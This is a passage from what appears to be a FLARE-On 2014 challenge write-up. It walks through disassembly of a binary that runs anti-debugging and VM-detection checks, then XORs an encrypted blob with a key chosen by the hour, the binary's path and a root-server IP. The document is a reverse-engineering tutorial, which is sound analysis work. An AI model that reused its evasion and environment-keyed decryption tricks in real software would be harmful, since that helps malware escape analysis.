<a class=header-link href=#function-11---hour-of-the-wolf><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>Electric_Boogaloo</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>OutputDebugString</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>ICanHaz?</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>NtGlobalFlag</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>SandsOfTime</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BackDoge</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>IPCheck</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span>   <span style=color:#586e75>; you are here</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-18.jpg alt="Hour check" title="Hour check"></p><p>Again, we see the familiar <code>time64</code> and <code>localtime64</code> calls. This time offset 8 of the <code>tm</code> structure (copied below) is compared with <code>0x11</code> or <code>17</code>. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.</p><figure class=code><figcaption><span>tm</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#586e75>// each field is an int (4 bytes)
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>
</span></span><span style=display:flex><span>tm_sec:     Seconds after minute (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>59</span>).  ; index: <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>tm_min:     Minutes after hour (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>59</span>).    ; index: <span style=color:#2aa198>4</span>
</span></span><span style=display:flex><span>tm_hour:    Hours after midnight (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>23</span>).  ; index: <span style=color:#2aa198>8</span>
</span></span><span style=display:flex><span>tm_mday:    Day of month (<span style=color:#2aa198>1</span> – <span style=color:#2aa198>31</span>).
</span></span><span style=display:flex><span>tm_mon:     Month (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>11</span>; January <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>).
</span></span><span style=display:flex><span>tm_year:    Year (current year minus <span style=color:#2aa198>1900</span>).
</span></span><span style=display:flex><span>tm_wday:    Day of week (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>6</span>; Sunday <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>).
</span></span><span style=display:flex><span>tm_yday:    Day of year (<span style=color:#2aa198>0</span> – <span style=color:#2aa198>365</span>; January <span style=color:#2aa198>1</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>).
</span></span><span style=display:flex><span>tm_isdst:   Positive value <span style=color:#719e07>if</span> daylight saving time is in effect; <span style=color:#2aa198>0</span> <span style=color:#719e07>if</span> daylight saving time is not in effect; negative value <span style=color:#719e07>if</span> status of daylight saving time is unknown.</span></span></code></pre></td></tr></table></div></div></div></figure><p>If time check passes, blob is xor-ed with <code>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</code> otherwise it will be xor-ed with <code>\x07\x77</code>.</p><figure class=code><figcaption><span>Hour check</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (Hour <span style=color:#719e07>==</span> <span style=color:#2aa198>17</span>)):   <span style=color:#586e75># Between 5 and 6 PM</span>
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span style=color:#2aa198>&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\x07\x77</span><span style=color:#2aa198>&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=interlude---12---fullpath-xor>Interlude - 12 - Fullpath xor
<a class=header-link href=#interlude---12---fullpath-xor><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BackDoge</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>IPCheck</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>HourCheck</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B4C</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ebx</span>, <span style=color:#b58900>bl</span><span style=color:#268bd2>ob_length</span> <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B52</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edi</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B54</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B56</span> <span style=color:#268bd2>test</span>    <span style=color:#b58900>ebx</span>, <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B58</span> <span style=color:#268bd2>jz</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_401B83</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B5A</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>ebx</span>, [<span style=color:#b58900>ebx</span><span style=color:#719e07>+</span><span style=color:#2aa198>0</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B60</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B60</span> <span style=color:#268bd2>loc_401B60</span>:                             <span style=color:#586e75>; CODE XREF: .text:00401B81j</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B60</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0AAAAAAABh</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B65</span> <span style=color:#268bd2>mul</span>     <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B67</span> <span style=color:#268bd2>shr</span>     <span style=color:#b58900>edx</span>, <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B6A</span> <span style=color:#268bd2>lea</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>edx</span><span style=color:#719e07>+</span><span style=color:#b58900>edx</span><span style=color:#719e07>*</span><span style=color:#2aa198>2</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B6D</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B6F</span> <span style=color:#268bd2>add</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B71</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edx</span>, <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B73</span> <span style=color:#268bd2>sub</span>     <span style=color:#b58900>edx</span>, <span style=color:#b58900>eax</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B75</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>al</span>, [<span style=color:#b58900>edx</span><span style=color:#719e07>+</span><span style=color:#b58900>edi</span>]    <span style=color:#586e75>; Moving full path to al by character</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B78</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>[<span style=color:#b58900>ecx</span>], <span style=color:#b58900>al</span>    <span style=color:#586e75>; xor-ing full path with blob</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B7E</span> <span style=color:#268bd2>inc</span>     <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B7F</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ebx</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B81</span> <span style=color:#268bd2>jb</span>      <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_401B60</span> <span style=color:#586e75>; jump back up to xor the next char</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>loc_401B83</span>:                             <span style=color:#586e75>; CODE XREF: .text:00401B58j</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4017A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B88</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4018A0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>We finished the first 10 functions, YAY. Now we see that the full path of binary is xor-ed with the blob. However, <strong>keep in mind that one of the checks compared full path with <code>backdoge.exe</code></strong>.</p><figure class=code><figcaption><span>Fullpath xor</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>blob <span style=color:#719e07>=</span> xor(blob, fullpath)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-13---internet-rootz>Function 13 - Internet Rootz
<a class=header-link href=#function-13---internet-rootz><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>loc_401B83</span>:                             <span style=color:#586e75>; CODE XREF: .text:00401B58j</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4017A0</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B88</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4018A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B8D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>4</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B90</span> <span style=color:#268bd2>movzx</span>   <span style=color:#b58900>edx</span>, <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ecx</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B93</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>, <span style=color:#b58900>dl</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Two more functions. We're getting there.</p><p><img src=/images/2014/flare/7-19.jpg alt="Fetching IP for e.root-servers.net" title="Fetching IP for e.root-servers.net"></p><p>We have seen this type of code. This function pushes <code>e.root-servers.net</code> to stack and then calls <code>gethostbyname</code> to retrieve its IP <code>192.203.230.10</code>. If the result is not zero, <code>h_addrtype</code> is checked for 2 (<code>AF_INET</code>) and retrieved IP is converted into ASCII format.</p><p><img src=/images/2014/flare/7-20.jpg alt="xor-ing IP with blob" title="xor-ing IP with blob"></p><p>The rest is pretty simple. <code>192.203.230.10</code> is xor-ed with the blob.</p><figure class=code><figcaption><span>Fullpath xor</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;192.203.230.10&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-14---jackrat>Function 14 - jackRAT
<a class=header-link href=#function-14---jackrat><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>loc_401B83</span>:                             <span style=color:#586e75>; CODE XREF: .text:00401B58j</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B83</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>InternetRootz</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B88</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4018A0</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B8D</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, [<span style=color:#b58900>esi</span><span style=color:#719e07>+</span><span style=color:#2aa198>4</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B90</span> <span style=color:#268bd2>movzx</span>   <span style=color:#b58900>edx</span>, <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ecx</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B93</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>bl</span><span style=color:#268bd2>ob</span>, <span style=color:#b58900>dl</span></span></span></code></pre></td></tr></table></div></div></div></figure><figure class=code><figcaption><span>sub_4018A0</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
